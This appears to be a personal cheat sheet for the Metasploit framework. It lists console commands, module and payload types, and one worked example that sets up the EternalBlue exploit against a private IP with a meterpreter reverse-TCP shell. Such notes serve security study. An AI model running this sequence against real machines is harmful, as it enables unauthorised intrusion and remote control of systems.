	
### General Commands

use (exploit)                                  Use a specific exploit module
set RHOST (target)                       Set target IP
set LHOST (local)                          Set local IP for reverse shell
set PAYLOAD (payload)                 Set the exploit payload
exploit                                               Execute the exploit
search (term)                                  Search for exploits by keyword
show options                                    View options for the loaded exploit
show targets		                               check who is targeted
sessions -i (id)                                Interact with a session
background                                       Background the current session
db update		                                   update db
### Example:
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.10
set LHOST 192.168.1.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp

Auxilary		                                   scanning fuzzing sniffing admin admin capabilities
Encoder			                               ensure payload is perfectly working
Exploit			                                   module that exploits vulnerability
NOP(no operation code)	           keep payload size consistent
payload			                               use the exploit to launch attack
plugins			                               additional scripts to add
post			                                       infornmation gathering



### types of payload
	single	exploit and shellcode for the task
	stagers perfoms specific task and works with stages
	stages	payloads downloaded by stagers and has adv features


> [!NOTE]
> location of metasploit /usr/share/metasploit-framework/


